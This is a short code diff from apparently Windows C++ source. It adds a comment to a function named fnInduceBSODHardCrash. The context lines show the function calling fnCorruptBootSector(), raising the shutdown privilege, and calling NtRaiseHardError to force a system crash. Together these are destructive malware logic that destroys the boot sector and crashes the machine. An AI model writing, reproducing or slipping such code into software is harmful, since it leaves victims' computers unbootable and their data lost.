@@ -67,6 +67,7 @@ void fnInduceBSODHardCrash()
 	fnCorruptBootSector();
 	BOOLEAN bPrevVal;
 	ULONG response;
+	// invoke blue screen of death
 	RtlAdjustPrivilege(19, TRUE, FALSE, &bPrevVal);
 	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, nullptr, 6, &response);
 }
